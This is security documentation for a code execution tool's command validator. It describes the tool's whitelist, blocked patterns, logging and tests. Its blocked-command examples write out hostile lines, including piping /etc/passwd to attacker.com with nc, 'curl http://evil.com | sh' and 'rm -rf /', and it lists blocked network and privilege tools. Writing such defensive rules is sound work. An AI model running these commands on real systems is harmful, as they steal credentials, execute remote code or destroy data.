# Security Documentation

## Command Execution Security

This document outlines the security measures implemented to prevent command injection vulnerabilities in the code execution tool.

### Overview

The code execution tool now includes a comprehensive security validation framework that prevents command injection attacks while maintaining functionality for legitimate use cases.

### Security Features

#### 1. Command Validation Framework

The `CommandValidator` class provides multi-layered security validation:

- **Whitelist Validation**: Only allows commands from a predefined whitelist of safe commands
- **Blacklist Pattern Detection**: Blocks dangerous patterns and attack vectors
- **Quote-Aware Parsing**: Properly handles quoted arguments to prevent false positives
- **Argument Validation**: Validates individual arguments for safety

#### 2. Allowed Commands

The following commands are whitelisted for execution:

**File Operations:**
- `ls`, `cat`, `head`, `tail`, `grep`, `find`, `wc`, `sort`, `uniq`

**Directory Operations:**
- `pwd`, `cd`, `mkdir`, `rmdir`, `rm`, `cp`, `mv`, `ln`

**Text Processing:**
- `echo`, `printf`, `sed`, `awk`, `tr`, `cut`, `split`, `join`

**System Information:**
- `whoami`, `id`, `uname`, `date`, `uptime`, `df`, `du`, `free`

**Process Management:**
- `ps`, `top`, `htop`, `jobs`, `kill`, `killall`

**Network (Read-Only):**
- `ping`, `nslookup`, `dig`, `netstat`, `ss`, `lsof`

**Development Tools:**
- `git`, `python`, `python3`, `node`, `npm`, `pip`, `pip3`

#### 3. Blocked Patterns

The following patterns are blocked to prevent attacks:

**Command Injection Vectors:**
- Shell metacharacters outside quotes: `;`, `|`, `&`, `` ` ``, `$()`
- Command chaining: `&&`, `||`
- Dangerous redirections: `>>`, `<<`, `<>`

**Dangerous Commands:**
- System destruction: `rm -rf /`, `dd`, `mkfs`, `fdisk`
- System control: `shutdown`, `reboot`, `halt`
- Privilege escalation: `su`, `sudo`, `passwd`
- Network operations: `ssh`, `scp`, `iptables`, `nc`, `nmap`

**Script Execution:**
- Direct script execution: `./script.sh`, `bash script.sh`
- Unsafe interpreters: `perl`, `ruby`, `zsh`, `fish` (when used directly)

#### 4. Security Logging

All security events are logged with:
- Event type (e.g., "BLOCKED_COMMAND")
- The command that was blocked
- Reason for blocking

### Usage Examples

#### Allowed Commands
```bash
ls -la                                    # ✅ Allowed
cat "file with spaces.txt"               # ✅ Allowed (quoted)
grep "pattern" file.txt                  # ✅ Allowed
find /home -name "*.py"                  # ✅ Allowed
git status                               # ✅ Allowed
python script.py                         # ✅ Allowed
```

#### Blocked Commands
```bash
ls; rm -rf /                             # ❌ Blocked (command chaining)
cat /etc/passwd | nc attacker.com 1234   # ❌ Blocked (pipe to dangerous command)
curl http://evil.com | sh                # ❌ Blocked (download and execute)
$(whoami)                                # ❌ Blocked (command substitution)
`id`                                     # ❌ Blocked (backtick substitution)
sudo rm -rf /                            # ❌ Blocked (privilege escalation)
./malicious.sh                           # ❌ Blocked (direct script execution)
```

### Implementation Details

#### Validation Process

1. **Input Validation**: Check for empty or invalid commands
2. **Pattern Detection**: Scan for dangerous patterns outside quotes
3. **Command Parsing**: Use `shlex.split()` for proper quote handling
4. **Whitelist Check**: Verify base command is in allowed list
5. **Argument Validation**: Validate individual arguments

#### Quote Handling

The validator properly handles quoted arguments:
- Content inside quotes is safe from shell interpretation
- Quoted arguments with spaces are allowed
- Dangerous patterns inside quotes are allowed (since they're not executed)

#### Error Handling

- Invalid syntax returns descriptive error messages
- Security events are logged for monitoring
- Failed validations return clear reasons

### Testing

Comprehensive security tests are included in `tests/test_security.py`:

- **Allowed Commands Test**: Verifies all whitelisted commands work
- **Injection Vector Tests**: Tests various attack patterns are blocked
- **Dangerous Command Tests**: Ensures dangerous system commands are blocked
- **Edge Case Tests**: Handles boundary conditions and unusual inputs
- **Quote Handling Tests**: Validates proper quote processing

Run tests with:
```bash
python tests/test_security.py
```

### Security Considerations

#### Defense in Depth

This implementation uses multiple layers of security:
1. **Whitelist**: Only known safe commands allowed
2. **Blacklist**: Dangerous patterns explicitly blocked
3. **Parsing**: Proper quote handling prevents bypasses
4. **Logging**: All security events recorded

#### Limitations

- **Python/Node Scripts**: While `python` and `node` commands are allowed, dangerous arguments are still blocked
- **Complex Commands**: Very complex command lines may need manual review
- **Future Threats**: New attack vectors may require pattern updates

#### Recommendations

1. **Regular Updates**: Keep blacklist patterns updated
2. **Monitoring**: Review security logs regularly
3. **Testing**: Run security tests after any changes
4. **Review**: Periodically review allowed commands list

### Migration Guide

#### For Existing Code

The security validation is automatically applied to terminal commands in the `CodeExecution` tool. No changes are required for existing code.

#### For New Development

When using terminal commands:
1. Use whitelisted commands when possible
2. Quote arguments with spaces or special characters
3. Avoid complex shell constructs
4. Test commands with the security validator

### Troubleshooting

#### Common Issues

**Command Blocked Unexpectedly**
- Check if the command is in the whitelist
- Verify arguments don't contain blocked patterns
- Use quotes for arguments with special characters

**Security Events in Logs**
- Review the blocked command and reason
- Determine if it's a false positive or legitimate attack
- Update patterns if necessary

#### Getting Help

For security-related issues:
1. Check the security logs for detailed error messages
2. Review this documentation for allowed patterns
3. Run the security test suite to verify functionality
4. Consult the development team for security concerns

### Future Enhancements

Planned security improvements:
- [ ] Configurable whitelist/blacklist
- [ ] Advanced sandboxing for command execution
- [ ] Real-time threat intelligence integration
- [ ] Enhanced logging and monitoring
- [ ] User-specific command permissions